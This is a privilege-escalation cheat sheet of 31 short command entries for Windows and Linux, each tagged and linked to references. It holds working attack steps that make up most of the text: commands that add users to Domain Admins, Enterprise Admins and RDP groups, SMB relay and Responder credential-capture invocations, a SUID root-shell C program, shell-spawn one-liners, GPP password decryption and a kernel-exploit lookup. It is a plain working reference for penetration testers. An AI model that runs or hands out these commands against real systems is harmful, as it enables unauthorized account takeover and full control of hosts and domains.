### 1. Windows process list
```
tasklist /v
```
**- enumeration,Windows,process management,privilege escalation**
#### References:

https://technet.microsoft.com/en-gb/library/bb491010.aspx
__________
### 2. Unquoted Service Paths
```
wmic service get name,displayname,pathname,startmode
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
__________
### 3. Unquoted Service Paths
```
sc query
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
__________
### 4. Unquoted Service Paths
```
sc qc "[SERVICE]"
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
__________
### 5. Unquoted Service Paths, start service
```
sc config "[SERVICE]" start= auto
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
__________
### 6. Add a domain user from the CLI
```
net user [user] [pass] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc771865(v=ws.11).aspx
__________
### 7. Add [User] to the domain admins group
```
net group "Domain Admins" [user] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
__________
### 8. Add user to enterprise admins
```
net group "Enterprise Admins" [user] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
__________
### 9. Add user to the RDP group
```
net localgroup "Remote Desktop Users" [user] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
__________
### 10. Add a user to the local admin group, not as useful any more
```
net localgroup "Administrators" [user] /add /domain
```
**- user information,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx
__________
### 11. smbrelay targeted
```
smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 12. smbrelay reflection : note read into http -> smb refelction
```
smbrelayx.py -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 13. responder NBNS LLMNR
```
/data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP]
```
**- linux,passwords,smb,MitM,privilege escalation**
#### References:

https://github.com/SpiderLabs/Responder
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
__________
### 14. system information
```
ver
```
**- enumeration,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/bb491028.aspx
__________
### 15. remote system info
```
systeminfo /S [victim] /U [domain]/[user] /P [pass]
```
**- enumeration,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-gb/library/bb491007.aspx
__________
### 16. search for text in the reg
```
reg query HKLM /f [text]  /t REG SZ /s
```
**- enumeration,Windows,privilege escalation,forensics**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
https://technet.microsoft.com/en-us/library/cc742028(v=ws.11).aspx
__________
### 17. grep for text in files
```
findstr /si [text] '.txt|xml|xls'
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
https://technet.microsoft.com/en-gb/library/bb490907.aspx
__________
### 18. list patches
```
wmic qfe
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 19. unquoted service path search add node for remote sys
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\windows\\" | findstr /i /v """
```
**- enumeration,Windows,privilege escalation**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 20. List windows scheduled tasks, older windows defender
```
schtasks /query /fo LIST /v
```
**- Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
__________
### 21. list installed patches on windows
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
__________
### 22. Do MSI's have admin rights?
```
reg query [HKCU|HKLM]\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
**- Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
__________
### 23. show the current path to see if we can subvert anything
```
echo %path%
```
**- Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
__________
### 24. Show service permissions, look for AU|AN|DU|LG, manual AccessChk, may help with bob ;)
```
sc sdshow [service]
```
**- Windows,privilege escalation**
#### References:

http://blogs.msmvps.com/erikr/2007/09/26/set-permissions-on-a-specific-service-windows/
__________
### 25. Simple SUID program  
```
int main(void){setresuid(0, 0, 0);system("/bin/bash");}
```
**- linux,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 26. perl spawn bash
```
perl -e 'exec "/bin/bash";'
```
**- perl,shell,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 27. python spawn bash
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
**- python,shell,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 28. Call a shell from a number of programs, VIM, Nmap FTP SFTP etc
```
!bash
```
**- linux,shell,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 29. Decrypt group policy preferences password aka Cpassword, use LAPS not GPP
```
/usr/bin/gpp-decrypt [cpassword]
```
**- smb,privilege escalation,hashes**
#### References:

http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html
__________
### 30. Locate SUID files owned by root
```
find / \( -type f -a -user root -a -perm -4001 \) 
```
**- linux,privilege escalation**
#### References:

https://pen-testing.sans.org/resources/papers/gcih/discovering-local-suid-exploit-105447
https://www.pentestpartners.com/blog/exploiting-suid-executables/
__________
### 31. Quick formatted link to check ketne exploits
```
echo "https://www.kernel-exploits.com/kernel/?version="`uname -r  | awk -F . '{print $1"."$2}'`
```
**- linux,privilege escalation**
#### References:

https://www.kernel-exploits.com
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
__________
